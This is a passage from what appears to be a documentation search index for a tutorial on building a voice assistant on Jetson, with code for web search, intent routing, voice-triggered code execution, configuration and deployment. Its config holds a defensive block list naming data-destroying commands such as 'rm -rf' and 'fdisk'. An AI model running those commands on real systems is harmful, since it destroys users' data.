line.split(\"  \"))\n                text = ' '.join(chunk for chunk in chunks if chunk)\n\n                return text[:2000] if text else \"\"\n            except:\n                pass\n\n            return \"\"\n\n        except Exception as e:\n            print(f\"Content extraction error for {url}: {e}\")\n            return \"\"\n\n    def search_and_extract(self, query: SearchQuery) -&gt; List[SearchResult]:\n        \"\"\"Perform search and extract content from results\"\"\"\n        # Try DuckDuckGo first\n        results = self.search_duckduckgo(query)\n\n        # Fallback to Google if no results\n        if not results:\n            results = self.search_google_fallback(query)\n\n        # Extract content for top results\n        for i, result in enumerate(results[:3]):  # Only extract content for top 3\n            if result.url:\n                content = self.extract_content(result.url)\n                result.content = content\n\n                # Calculate relevance score based on query terms\n                query_terms = query.query.lower().split()\n                text_to_score = (result.title + \" \" + result.snippet + \" \" + result.content).lower()\n\n                score = 0\n                for term in query_terms:\n                    score += text_to_score.count(term)\n\n                result.relevance_score = score / len(query_terms) if query_terms else 0\n\n        # Sort by relevance score\n        results.sort(key=lambda x: x.relevance_score, reverse=True)\n\n        return results\n\nclass VoiceWebSearchEngine:\n    \"\"\"Voice-optimized web search interface\"\"\"\n\n    def __init__(self):\n        self.search_engine = AdvancedWebSearchEngine()\n        self.search_history = []\n\n    def process_voice_search(self, voice_input: str) -&gt; str:\n        \"\"\"Process voice search query and return formatted results\"\"\"\n        voice_input = voice_input.strip()\n\n        # Extract search query from voice input\n        query_text = self._extract_search_query(voice_input)\n\n        if not query_text:\n            return \"Please specify what you'd like to search for.\"\n\n        # Determine search type\n        search_type = self._determine_search_type(voice_input)\n\n        # Create search query\n        search_query = SearchQuery(\n            query=query_text,\n            max_results=3,  # Limit for voice response\n            search_type=search_type\n        )\n\n        # Perform search\n        results = self.search_engine.search_and_extract(search_query)\n\n        # Store in history\n        self.search_history.append({\n            'query': query_text,\n            'results': results,\n            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')\n        })\n\n        # Format results for voice response\n        return self._format_voice_response(query_text, results)\n\n    def _extract_search_query(self, voice_input: str) -&gt; str:\n        \"\"\"Extract search query from voice input\"\"\"\n        voice_input = voice_input.lower()\n\n        # Remove common search prefixes\n        prefixes = [\n            \"search for\", \"search\", \"look up\", \"find\", \"what is\", \"who is\",\n            \"where is\", \"when is\", \"how to\", \"tell me about\", \"information about\",\n            \"please search\", \"can you search\", \"google\", \"web search\"\n        ]\n\n        query = voice_input\n        for prefix in prefixes:\n            if query.startswith(prefix):\n                query = query[len(prefix):].strip()\n                break\n\n        return query\n\n    def _determine_search_type(self, voice_input: str) -&gt; str:\n        \"\"\"Determine search type from voice input\"\"\"\n        voice_input = voice_input.lower()\n\n        if any(word in voice_input for word in ['news', 'latest', 'recent', 'breaking']):\n            return 'news'\n        elif any(word in voice_input for word in ['image', 'picture', 'photo']):\n            return 'images'\n        elif any(word in voice_input for word in ['video', 'watch', 'youtube']):\n            return 'videos'\n        else:\n            return 'web'\n\n    def _format_voice_response(self, query: str, results: List[SearchResult]) -&gt; str:\n        \"\"\"Format search results for voice response\"\"\"\n        if not results:\n            return f\"I couldn't find any results for '{query}'. Please try a different search term.\"\n\n        response = f\"I found {len(results)} results for '{query}'. \"\n\n        for i, result in enumerate(results[:2], 1):  # Top 2 results for voice\n            response += f\"Result {i}: {result.title}. \"\n\n            # Add snippet or content preview\n            preview = result.content if result.content else result.snippet\n            if preview:\n                # Limit preview length for voice\n                preview = preview[:150]\n                if len(preview) == 150:\n                    preview += \"...\"\n                response += f\"{preview} \"\n\n            response += f\"Source: {result.source}. \"\n\n        if len(results) &gt; 2:\n            response += f\"And {len(results) - 2} more results available.\"\n\n        return response\n\n    def get_search_history(self) -&gt; str:\n        \"\"\"Get recent search history\"\"\"\n        if not self.search_history:\n            return \"No searches have been performed yet.\"\n\n        recent = self.search_history[-3:]  # Last 3 searches\n        response = \"Recent searches: \"\n\n        for i, search in enumerate(recent, 1):\n            response += f\"{i}. '{search['query']}' at {search['timestamp']}. \"\n\n        return response\n\n    def get_detailed_result(self, result_index: int = 0) -&gt; str:\n        \"\"\"Get detailed content from a specific search result\"\"\"\n        if not self.search_history:\n            return \"No recent searches to get details from.\"\n\n        last_search = self.search_history[-1]\n        results = last_search['results']\n\n        if result_index &gt;= len(results):\n            return f\"Result {result_index + 1} not found. Only {len(results)} results available.\"\n\n        result = results[result_index]\n\n        response = f\"Detailed information for '{result.title}': \"\n\n        if result.content:\n            content_preview = result.content[:500]\n            if len(result.content) &gt; 500:\n                content_preview += \"...\"\n            response += content_preview\n        else:\n            response += result.snippet\n\n        response += f\" Source URL: {result.url}\"\n\n        return response\n\n# Usage example\nvoice_search = VoiceWebSearchEngine()\n\n# Example voice searches\nresponse1 = voice_search.process_voice_search(\"search for latest AI news\")\nresponse2 = voice_search.process_voice_search(\"what is machine learning\")\nresponse3 = voice_search.process_voice_search(\"how to install Python on Jetson\")\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#complete-voice-assistant-integration","title":"\ud83e\udd16 Complete Voice Assistant Integration","text":""},{"location":"curriculum/my_10b_voice_assistant_jetson/#unified-voice-assistant-system","title":"Unified Voice Assistant System","text":"<pre><code>import asyncio\nimport threading\nimport queue\nimport time\nfrom typing import Dict, List, Optional, Any\nfrom dataclasses import dataclass\nimport json\nfrom datetime import datetime\n\n# Import all our components\nfrom advanced_audio_processor import AdvancedAudioProcessor\nfrom translation_engine import AdvancedTranslationEngine, RealTimeTranslator\nfrom rag_system import VoiceRAGProcessor, VoiceDocumentSearch\nfrom code_executor import VoiceCodeExecutor\nfrom web_search import VoiceWebSearchEngine\n\n@dataclass\nclass VoiceCommand:\n    \"\"\"Structure for voice commands\"\"\"\n    text: str\n    language: str\n    confidence: float\n    timestamp: datetime\n    intent: str = \"\"\n    entities: Dict[str, Any] = None\n\n@dataclass\nclass AssistantResponse:\n    \"\"\"Structure for assistant responses\"\"\"\n    text: str\n    audio_data: Optional[bytes] = None\n    language: str = \"en\"\n    metadata: Dict[str, Any] = None\n\nclass IntentClassifier:\n    \"\"\"Simple intent classification for voice commands\"\"\"\n\n    def __init__(self):\n        self.intent_patterns = {\n            'translation': [\n                'translate', 'translation', 'say in', 'convert to', 'how do you say'\n            ],\n            'document_search': [\n                'search documents', 'find in documents', 'look up', 'document search',\n                'search files', 'find file', 'what does the document say'\n            ],\n            'code_execution': [\n                'run command', 'execute', 'run python', 'system command', 'terminal',\n                'run code', 'execute code'\n            ],\n            'web_search': [\n                'search web', 'google', 'search for', 'look up online', 'web search',\n                'find online', 'search internet'\n            ],\n            'system_info': [\n                'system status', 'system info', 'computer info', 'hardware info',\n                'memory usage', 'cpu usage'\n            ],\n            'conversation': [\n                'hello', 'hi', 'how are you', 'what can you do', 'help',\n                'thank you', 'goodbye', 'bye'\n            ]\n        }\n\n    def classify_intent(self, text: str) -&gt; str:\n        \"\"\"Classify the intent of the voice command\"\"\"\n        text_lower = text.lower()\n\n        for intent, patterns in self.intent_patterns.items():\n            for pattern in patterns:\n                if pattern in text_lower:\n                    return intent\n\n        return 'conversation'  # Default intent\n\nclass ComprehensiveVoiceAssistant:\n    \"\"\"Complete voice assistant with all capabilities\"\"\"\n\n    def __init__(self, \n                 documents_path: str = \"./documents\",\n                 default_language: str = \"en\"):\n\n        print(\"\ud83d\ude80 Initializing Comprehensive Voice Assistant...\")\n\n        # Core components\n        self.audio_processor = AdvancedAudioProcessor()\n        self.translation_engine = AdvancedTranslationEngine()\n        self.intent_classifier = IntentClassifier()\n\n        # Specialized engines\n        self.rag_processor = VoiceRAGProcessor(documents_path)\n        self.document_search = VoiceDocumentSearch(self.rag_processor)\n        self.code_executor = VoiceCodeExecutor()\n        self.web_search = VoiceWebSearchEngine()\n\n        # Assistant state\n        self.default_language = default_language\n        self.current_language = default_language\n        self.conversation_history = []\n        self.user_preferences = {\n            'language': default_language,\n            'voice_speed': 'normal',\n            'response_length': 'medium'\n        }\n\n        # Audio queues for real-time processing\n        self.audio_queue = queue.Queue()\n        self.response_queue = queue.Queue()\n\n        # Control flags\n        self.is_listening = False\n        self.is_processing = False\n\n        print(\"\u2705 Voice Assistant initialized successfully!\")\n        print(\"\ud83c\udfa4 Ready to listen...\")\n\n    def start_listening(self):\n        \"\"\"Start the voice assistant listening loop\"\"\"\n        self.is_listening = True\n\n        # Start audio processing thread\n        audio_thread = threading.Thread(target=self._audio_processing_loop)\n        audio_thread.daemon = True\n        audio_thread.start()\n\n        # Start command processing thread\n        command_thread = threading.Thread(target=self._command_processing_loop)\n        command_thread.daemon = True\n        command_thread.start()\n\n        print(\"\ud83c\udfa7 Voice Assistant is now listening...\")\n        print(\"Say 'Hey Assistant' to wake up, or 'Stop listening' to pause\")\n\n        try:\n            while self.is_listening:\n                time.sleep(0.1)\n        except KeyboardInterrupt:\n            self.stop_listening()\n\n    def stop_listening(self):\n        \"\"\"Stop the voice assistant\"\"\"\n        self.is_listening = False\n        print(\"\ud83d\uded1 Voice Assistant stopped listening\")\n\n    def _audio_processing_loop(self):\n        \"\"\"Continuous audio processing loop\"\"\"\n        while self.is_listening:\n            try:\n                # Get audio from microphone\n                audio_data = self.audio_processor.get_audio_chunk()\n\n                if audio_data and self.audio_processor.is_speech(audio_data):\n                    # Transcribe audio\n                    transcription = self.audio_processor.transcribe_audio(audio_data)\n\n                    if transcription and transcription.strip():\n                        # Detect language\n                        detected_lang = self.audio_processor.detect_language(transcription)\n\n                        # Create voice command\n                        command = VoiceCommand(\n                            text=transcription,\n                            language=detected_lang,\n                            confidence=0.8,  # Placeholder\n                            timestamp=datetime.now()\n                        )\n\n                        # Add to processing queue\n                        self.audio_queue.put(command)\n\n            except Exception as e:\n                print(f\"Audio processing error: {e}\")\n                time.sleep(0.1)\n\n    def _command_processing_loop(self):\n        \"\"\"Process voice commands from the queue\"\"\"\n        while self.is_listening:\n            try:\n                if not self.audio_queue.empty():\n                    command = self.audio_queue.get()\n\n                    # Check for wake word or stop command\n                    if self._is_wake_word(command.text):\n                        print(\"\ud83d\udc42 Assistant activated!\")\n                        continue\n                    elif self._is_stop_command(command.text):\n                        self.stop_listening()\n                        continue\n\n                    # Process the command\n                    response = self._process_voice_command(command)\n\n                    # Add to response queue\n                    self.response_queue.put(response)\n\n                    # Speak the response\n                    self._speak_response(response)\n\n                else:\n                    time.sleep(0.1)\n\n            except Exception as e:\n                print(f\"Command processing error: {e}\")\n                time.sleep(0.1)\n\n    def _is_wake_word(self, text: str) -&gt; bool:\n        \"\"\"Check if text contains wake word\"\"\"\n        wake_words = ['hey assistant', 'hello assistant', 'assistant']\n        text_lower = text.lower()\n        return any(wake in text_lower for wake in wake_words)\n\n    def _is_stop_command(self, text: str) -&gt; bool:\n        \"\"\"Check if text contains stop command\"\"\"\n        stop_words = ['stop listening', 'stop assistant', 'goodbye assistant']\n        text_lower = text.lower()\n        return any(stop in text_lower for stop in stop_words)\n\n    def _process_voice_command(self, command: VoiceCommand) -&gt; AssistantResponse:\n        \"\"\"Process a voice command and generate response\"\"\"\n        try:\n            print(f\"\ud83d\udde3\ufe0f Processing: '{command.text}' (Language: {command.language})\")\n\n            # Classify intent\n            intent = self.intent_classifier.classify_intent(command.text)\n            command.intent = intent\n\n            # Update current language if different\n            if command.language != self.current_language:\n                self.current_language = command.language\n\n            # Route to appropriate handler\n            if intent == 'translation':\n                response_text = self._handle_translation(command)\n            elif intent == 'document_search':\n                response_text = self._handle_document_search(command)\n            elif intent == 'code_execution':\n                response_text = self._handle_code_execution(command)\n            elif intent == 'web_search':\n                response_text = self._handle_web_search(command)\n            elif intent == 'system_info':\n                response_text = self._handle_system_info(command)\n            else:\n                response_text = self._handle_conversation(command)\n\n            # Create response\n            response = AssistantResponse(\n                text=response_text,\n                language=self.current_language,\n                metadata={\n                    'intent': intent,\n                    'processing_time': time.time(),\n                    'original_language': command.language\n                }\n            )\n\n            # Add to conversation history\n            self.conversation_history.append({\n                'command': command,\n                'response': response,\n                'timestamp': datetime.now()\n            })\n\n            return response\n\n        except Exception as e:\n            print(f\"Command processing error: {e}\")\n            return AssistantResponse(\n                text=\"I'm sorry, I encountered an error processing your request.\",\n                language=self.current_language\n            )\n\n    def _handle_translation(self, command: VoiceCommand) -&gt; str:\n        \"\"\"Handle translation requests\"\"\"\n        try:\n            # Extract target language and text to translate\n            text = command.text.lower()\n\n            # Simple extraction logic (can be improved)\n            if 'to spanish' in text or 'in spanish' in text:\n                target_lang = 'es'\n            elif 'to french' in text or 'in french' in text:\n                target_lang = 'fr'\n            elif 'to german' in text or 'in german' in text:\n                target_lang = 'de'\n            elif 'to chinese' in text or 'in chinese' in text:\n                target_lang = 'zh'\n            else:\n                return \"Please specify the target language for translation.\"\n\n            # Extract text to translate (simplified)\n            text_to_translate = text.replace('translate', '').replace('to spanish', '').replace('in spanish', '').strip()\n\n            if not text_to_translate:\n                return \"Please specify what you'd like me to translate.\"\n\n            # Perform translation\n            result = self.translation_engine.translate_with_context(\n                text_to_translate, \n                target_lang, \n                command.language\n            )\n\n            response = f\"Translation to {target_lang}: {result['translation']}\"\n            if result.get('cultural_notes'):\n                response += f\". Cultural note: {result['cultural_notes'][0]}\"\n\n            return response\n\n        except Exception as e:\n            return f\"Translation error: {str(e)}\"\n\n    def _handle_document_search(self, command: VoiceCommand) -&gt; str:\n        \"\"\"Handle document search requests\"\"\"\n        return self.document_search.search_documents(command.text)\n\n    def _handle_code_execution(self, command: VoiceCommand) -&gt; str:\n        \"\"\"Handle code execution requests\"\"\"\n        return self.code_executor.process_voice_command(command.text)\n\n    def _handle_web_search(self, command: VoiceCommand) -&gt; str:\n        \"\"\"Handle web search requests\"\"\"\n        return self.web_search.process_voice_search(command.text)\n\n    def _handle_system_info(self, command: VoiceCommand) -&gt; str:\n        \"\"\"Handle system information requests\"\"\"\n        return self.code_executor._handle_system_info()\n\n    def _handle_conversation(self, command: VoiceCommand) -&gt; str:\n        \"\"\"Handle general conversation\"\"\"\n        text = command.text.lower()\n\n        if any(greeting in text for greeting in ['hello', 'hi', 'hey']):\n            return f\"Hello! I'm your AI assistant. I can help you with translations, document search, code execution, and web search. What would you like to do?\"\n\n        elif any(question in text for question in ['what can you do', 'help', 'capabilities']):\n            return \"I can help you with: 1) Real-time translation between languages, 2) Searching your local documents, 3) Running system commands and Python code safely, 4) Searching the web for information, 5) System monitoring. Just speak naturally!\"\n\n        elif any(thanks in text for thanks in ['thank you', 'thanks']):\n            return \"You're welcome! Is there anything else I can help you with?\"\n\n        elif any(goodbye in text for goodbye in ['goodbye', 'bye', 'see you']):\n            return \"Goodbye! It was nice helping you today.\"\n\n        else:\n            return \"I'm not sure how to help with that. Try asking me to translate something, search documents, run a command, or search the web.\"\n\n    def _speak_response(self, response: AssistantResponse):\n        \"\"\"Convert response to speech (placeholder)\"\"\"\n        print(f\"\ud83d\udd0a Assistant: {response.text}\")\n        # Here you would integrate with a TTS system\n        # For now, we just print the response\n\n    def get_conversation_summary(self) -&gt; str:\n        \"\"\"Get a summary of recent conversation\"\"\"\n        if not self.conversation_history:\n            return \"No conversation history available.\"\n\n        recent = self.conversation_history[-5:]  # Last 5 exchanges\n        summary = \"Recent conversation: \"\n\n        for i, exchange in enumerate(recent, 1):\n            intent = exchange['command'].intent\n            summary += f\"{i}. {intent} request at {exchange['timestamp'].strftime('%H:%M')}. \"\n\n        return summary\n\n    def update_preferences(self, preferences: Dict[str, Any]):\n        \"\"\"Update user preferences\"\"\"\n        self.user_preferences.update(preferences)\n        print(f\"Updated preferences: {self.user_preferences}\")\n\n# Usage Example\nif __name__ == \"__main__\":\n    # Initialize the voice assistant\n    assistant = ComprehensiveVoiceAssistant(\n        documents_path=\"./documents\",\n        default_language=\"en\"\n    )\n\n    # Start listening (this will run continuously)\n    # assistant.start_listening()\n\n    # For testing without continuous listening:\n    test_commands = [\n        \"Hey assistant, search for machine learning in my documents\",\n        \"Translate 'Hello world' to Spanish\",\n        \"Run command ls -la\",\n        \"Search web for latest AI news\",\n        \"What's the system status?\"\n    ]\n\n    for cmd_text in test_commands:\n        command = VoiceCommand(\n            text=cmd_text,\n            language=\"en\",\n            confidence=0.9,\n            timestamp=datetime.now()\n        )\n\n        response = assistant._process_voice_command(command)\n        print(f\"Command: {cmd_text}\")\n        print(f\"Response: {response.text}\")\n        print(\"-\" * 50)\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#voice-assistant-configuration","title":"Voice Assistant Configuration","text":"<pre><code># config.py - Configuration file for the voice assistant\n\nVOICE_ASSISTANT_CONFIG = {\n    # Audio settings\n    \"audio\": {\n        \"sample_rate\": 16000,\n        \"chunk_size\": 1024,\n        \"channels\": 1,\n        \"vad_aggressiveness\": 2,\n        \"noise_reduction\": True,\n        \"auto_gain_control\": True\n    },\n\n    # Speech recognition\n    \"speech_recognition\": {\n        \"model_name\": \"openai/whisper-base\",\n        \"language\": \"auto\",\n        \"confidence_threshold\": 0.7,\n        \"max_audio_length\": 30  # seconds\n    },\n\n    # Translation\n    \"translation\": {\n        \"supported_languages\": [\"en\", \"es\", \"fr\", \"de\", \"zh\", \"ja\", \"ko\"],\n        \"default_source\": \"auto\",\n        \"cultural_context\": True,\n        \"pronunciation_guide\": True\n    },\n\n    # Document search\n    \"document_search\": {\n        \"supported_formats\": [\".pdf\", \".txt\", \".md\", \".docx\", \".csv\"],\n        \"chunk_size\": 1000,\n        \"chunk_overlap\": 200,\n        \"max_results\": 5,\n        \"similarity_threshold\": 0.7\n    },\n\n    # Code execution\n    \"code_execution\": {\n        \"timeout\": 30,\n        \"max_output_size\": 10000,\n        \"safe_mode\": True,\n        \"allowed_commands\": [\"ls\", \"pwd\", \"cat\", \"grep\", \"find\", \"ps\", \"df\"],\n        \"blocked_patterns\": [\"rm -rf\", \"sudo rm\", \"format\", \"fdisk\"]\n    },\n\n    # Web search\n    \"web_search\": {\n        \"default_engine\": \"duckduckgo\",\n        \"max_results\": 3,\n        \"content_extraction\": True,\n        \"timeout\": 10,\n        \"safe_search\": True\n    },\n\n    # Response generation\n    \"response\": {\n        \"max_length\": 200,  # words\n        \"language_adaptation\": True,\n        \"context_awareness\": True,\n        \"personality\": \"helpful_professional\"\n    },\n\n    # System\n    \"system\": {\n        \"log_level\": \"INFO\",\n        \"conversation_history_limit\": 100,\n        \"auto_save_preferences\": True,\n        \"privacy_mode\": True  # Don't log sensitive data\n    }\n}\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#complete-voice-assistant-demo","title":"\ud83e\uddea Complete Voice Assistant Demo","text":""},{"location":"curriculum/my_10b_voice_assistant_jetson/#quick-start-guide","title":"Quick Start Guide","text":"<pre><code># 1. Install all dependencies\npip install -r requirements.txt\n\n# 2. Download required models\npython -m spacy download en_core_web_sm\npython -m spacy download es_core_news_sm\npython -m spacy download fr_core_news_sm\n\n# 3. Set up document directory\nmkdir -p ./documents\n# Add your PDF, TXT, MD files to this directory\n\n# 4. Run the voice assistant\npython voice_assistant.py\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#complete-requirements-file","title":"Complete Requirements File","text":"<pre><code># requirements.txt\n# Core audio processing\npyaudio==0.2.11\nwebrtcvad==2.0.10\nnoisereduce==3.0.0\nlangdetect==1.0.9\n\n# Speech recognition and TTS\nopenai-whisper==20231117\ntransformers==4.35.2\ntorch==2.1.1\ntorchaudio==2.1.1\nsentencepiece==0.1.99\nprotobuf==4.25.1\n\n# Translation\ngoogletrans==4.0.0rc1\ndeep-translator==1.11.4\npolyglot==16.7.4\npyicu==2.12\npycld2==0.41\nfasttext==0.9.2\nspacy==3.7.2\n\n# Document processing and RAG\nlangchain==0.0.350\nfaiss-cpu==1.7.4\nsentence-transformers==2.2.2\npypdf2==3.0.1\npython-docx==1.1.0\nchromadb==0.4.18\nunstructured[local-inference]==0.11.6\npytesseract==0.3.10\npillow==10.1.0\npython-magic-bin==0.4.14\n\n# Code execution\nsubprocess32==3.5.4\npsutil==5.9.6\ndocker==6.1.3\nRestrictedPython==6.2\n\n# Web search and content extraction\nrequests==2.31.0\nbeautifulsoup4==4.12.2\nlxml==4.9.3\nselenium==4.15.2\nduckduckgo-search==3.9.6\ngooglesearch-python==1.2.3\nnewspaper3k==0.2.8\nreadability-lxml==0.8.1\ntrafilatura==1.6.4\nhtml2text==2020.1.16\n\n# Utilities\nnumpy==1.24.4\npandas==2.1.4\nscikit-learn==1.3.2\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#main-application-script","title":"Main Application Script","text":"<pre><code>#!/usr/bin/env python3\n# voice_assistant.py - Main application script\n\nimport sys\nimport os\nimport argparse\nimport logging\nfrom pathlib import Path\n\n# Add current directory to path for imports\nsys.path.append(os.path.dirname(os.path.abspath(__file__)))\n\nfrom comprehensive_voice_assistant import ComprehensiveVoiceAssistant, VOICE_ASSISTANT_CONFIG\n\ndef setup_logging(log_level: str = \"INFO\"):\n    \"\"\"Set up logging configuration\"\"\"\n    logging.basicConfig(\n        level=getattr(logging, log_level.upper()),\n        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',\n        handlers=[\n            logging.FileHandler('voice_assistant.log'),\n            logging.StreamHandler(sys.stdout)\n        ]\n    )\n\ndef main():\n    \"\"\"Main application entry point\"\"\"\n    parser = argparse.ArgumentParser(description='Advanced Voice Assistant for Jetson')\n    parser.add_argument('--documents', '-d', type=str, default='./documents',\n                       help='Path to documents directory')\n    parser.add_argument('--language', '-l', type=str, default='en',\n                       help='Default language (en, es, fr, de, zh, ja, ko)')\n    parser.add_argument('--config', '-c', type=str, default=None,\n                       help='Path to custom configuration file')\n    parser.add_argument('--demo', action='store_true',\n                       help='Run in demo mode (no continuous listening)')\n    parser.add_argument('--log-level', type=str, default='INFO',\n                       choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],\n                       help='Logging level')\n\n    args = parser.parse_args()\n\n    # Set up logging\n    setup_logging(args.log_level)\n    logger = logging.getLogger(__name__)\n\n    # Create documents directory if it doesn't exist\n    documents_path = Path(args.documents)\n    documents_path.mkdir(exist_ok=True)\n\n    logger.info(f\"Starting Voice Assistant with documents path: {documents_path}\")\n    logger.info(f\"Default language: {args.language}\")\n\n    try:\n        # Initialize voice assistant\n        assistant = ComprehensiveVoiceAssistant(\n            documents_path=str(documents_path),\n            default_language=args.language\n        )\n\n        if args.demo:\n            # Run demo mode\n            logger.info(\"Running in demo mode...\")\n            run_demo(assistant)\n        else:\n            # Start continuous listening\n            logger.info(\"Starting continuous listening mode...\")\n            logger.info(\"Press Ctrl+C to stop\")\n            assistant.start_listening()\n\n    except KeyboardInterrupt:\n        logger.info(\"Voice Assistant stopped by user\")\n    except Exception as e:\n        logger.error(f\"Error running Voice Assistant: {e}\")\n        sys.exit(1)\n\ndef run_demo(assistant):\n    \"\"\"Run the assistant in demo mode\"\"\"\n    from datetime import datetime\n    from comprehensive_voice_assistant import VoiceCommand\n\n    print(\"\\n\ud83c\udfa4 Voice Assistant Demo Mode\")\n    print(\"=\" * 50)\n    print(\"Available commands:\")\n    print(\"1. Translation: 'Translate hello world to Spanish'\")\n    print(\"2. Document Search: 'Search documents for machine learning'\")\n    print(\"3. Code Execution: 'Run command ls -la'\")\n    print(\"4. Web Search: 'Search web for latest AI news'\")\n    print(\"5. System Info: 'What's the system status?'\")\n    print(\"6. Conversation: 'Hello', 'What can you do?', 'Help'\")\n    print(\"\\nType 'quit' to exit\")\n    print(\"=\" * 50)\n\n    while True:\n        try:\n            user_input = input(\"\\n\ud83d\udde3\ufe0f You: \").strip()\n\n            if user_input.lower() in ['quit', 'exit', 'bye']:\n                print(\"\ud83d\udc4b Goodbye!\")\n                break\n\n            if not user_input:\n                continue\n\n            # Create voice command\n            command = VoiceCommand(\n                text=user_input,\n                language=\"en\",  # Assume English for demo\n                confidence=1.0,\n                timestamp=datetime.now()\n            )\n\n            # Process command\n            response = assistant._process_voice_command(command)\n\n            # Display response\n            print(f\"\ud83e\udd16 Assistant: {response.text}\")\n\n            # Show metadata\n            if response.metadata:\n                intent = response.metadata.get('intent', 'unknown')\n                print(f\"   \ud83d\udcca Intent: {intent}\")\n\n        except KeyboardInterrupt:\n            print(\"\\n\ud83d\udc4b Goodbye!\")\n            break\n        except Exception as e:\n            print(f\"\u274c Error: {e}\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#usage-examples","title":"Usage Examples","text":""},{"location":"curriculum/my_10b_voice_assistant_jetson/#1-multi-language-translation","title":"1. Multi-language Translation","text":"<pre><code># Start the assistant\npython voice_assistant.py --demo\n\n# Try these commands:\n\"Translate 'Good morning' to Spanish\"\n\"How do you say 'Thank you' in French?\"\n\"Convert 'Hello world' to German\"\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#2-document-search-with-rag","title":"2. Document Search with RAG","text":"<pre><code># Add documents to ./documents/ folder first\n# Then try:\n\"Search documents for artificial intelligence\"\n\"Find information about machine learning in my files\"\n\"What does the document say about neural networks?\"\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#3-safe-code-execution","title":"3. Safe Code Execution","text":"<pre><code># System commands:\n\"Run command ls -la\"\n\"Show system info\"\n\"List files in current directory\"\n\n# Python code:\n\"Run python code print('Hello from Jetson!')\"\n\"Execute python import math; print(math.pi)\"\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#4-web-search-integration","title":"4. Web Search Integration","text":"<pre><code>\"Search web for latest NVIDIA Jetson news\"\n\"Look up online how to install PyTorch on Jetson\"\n\"Find information about edge AI applications\"\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#performance-optimization-for-jetson","title":"Performance Optimization for Jetson","text":"<pre><code># jetson_optimizations.py\nimport torch\nimport os\n\ndef optimize_for_jetson():\n    \"\"\"Apply Jetson-specific optimizations\"\"\"\n\n    # Enable CUDA if available\n    if torch.cuda.is_available():\n        print(f\"\ud83d\ude80 CUDA available: {torch.cuda.get_device_name()}\")\n\n        # Set memory fraction to avoid OOM\n        torch.cuda.set_per_process_memory_fraction(0.7)\n\n        # Enable cuDNN benchmark for consistent input sizes\n        torch.backends.cudnn.benchmark = True\n\n        # Enable TF32 for faster training on Ampere GPUs\n        torch.backends.cuda.matmul.allow_tf32 = True\n        torch.backends.cudnn.allow_tf32 = True\n\n        print(\"\u2705 CUDA optimizations applied\")\n\n    # Set environment variables for better performance\n    os.environ['OMP_NUM_THREADS'] = '4'  # Adjust based on your Jetson model\n    os.environ['TOKENIZERS_PARALLELISM'] = 'false'  # Avoid warnings\n\n    print(\"\u2705 Jetson optimizations applied\")\n\n# Apply optimizations at startup\noptimize_for_jetson()\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#deployment-script","title":"Deployment Script","text":"<pre><code>#!/bin/bash\n# deploy_voice_assistant.sh\n\necho \"\ud83d\ude80 Deploying Voice Assistant on Jetson...\"\n\n# Update system\nsudo apt update\nsudo apt upgrade -y\n\n# Install system dependencies\nsudo apt install -y \\\n    python3-pip \\\n    python3-dev \\\n    portaudio19-dev \\\n    espeak-ng \\\n    espeak-ng-data \\\n    libespeak-ng1 \\\n    tesseract-ocr \\\n    ffmpeg \\\n    git\n\n# Install Python dependencies\npip3 install --upgrade pip\npip3 install -r requirements.txt\n\n# Download spaCy models\npython3 -m spacy download en_core_web_sm\npython3 -m spacy download es_core_news_sm\npython3 -m spacy download fr_core_news_sm\n\n# Create directories\nmkdir -p documents\nmkdir -p logs\n\n# Set permissions\nchmod +x voice_assistant.py\n\n# Create systemd service (optional)\nsudo tee /etc/systemd/system/voice-assistant.service &gt; /dev/null &lt;&lt;EOF\n[Unit]\nDescription=Voice Assistant Service\nAfter=network.target\n\n[Service]\nType=simple\nUser=$USER\nWorkingDirectory=$(pwd)\nExecStart=/usr/bin/python3 $(pwd)/voice_assistant.py\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\necho \"\u2705 Voice Assistant deployed successfully!\"\necho \"\ud83d\udcd6 Usage:\"\necho \"  Demo mode: python3 voice_assistant.py --demo\"\necho \"  Full mode: python3 voice_assistant.py\"\necho \"  Service:   sudo systemctl start voice-assistant\"\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#troubleshooting-guide","title":"Troubleshooting Guide","text":""},{"location":"curriculum/my_10b_voice_assistant_jetson/#common-issues-and-solutions","title":"Common Issues and Solutions","text":"<ol> <li> <p>Audio Input Issues <pre><code># Check audio devices\narecord -l\n\n# Test microphone\narecord -d 5 test.wav\naplay test.wav\n</code></pre></p> </li> <li> <p>CUDA Memory Issues <pre><code># Reduce memory usage in config\ntorch.cuda.set_per_process_memory_fraction(0.5)\n</code></pre></p> </li> <li> <p>Model Loading Errors <pre><code># Clear cache and reinstall\npip cache purge\npip install --force-reinstall transformers\n</code></pre></p> </li> <li> <p>Permission Errors <pre><code># Fix audio permissions\nsudo usermod -a -G audio $USER\n# Logout and login again\n</code></pre></p> </li> </ol>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#next-steps","title":"Next Steps","text":"<ol> <li>Add Text-to-Speech (TTS)</li> <li>Integrate with <code>espeak-ng</code> or <code>festival</code></li> <li> <p>Add voice synthesis for responses</p> </li> <li> <p>Enhance Intent Recognition</p> </li> <li>Train custom intent classification model</li> <li> <p>Add entity extraction</p> </li> <li> <p>Add Multimodal Capabilities</p> </li> <li>Camera integration for visual questions</li> <li> <p>Image description and analysis</p> </li> <li> <p>Cloud Integration</p> </li> <li>Optional cloud backup for conversations</li> <li> <p>Hybrid local/cloud processing</p> </li> <li> <p>Mobile App Interface</p> </li> <li>Create companion mobile app</li> <li>Remote voice control</li> </ol> <p>This comprehensive voice assistant provides a solid foundation for building advanced AI applications on Jetson 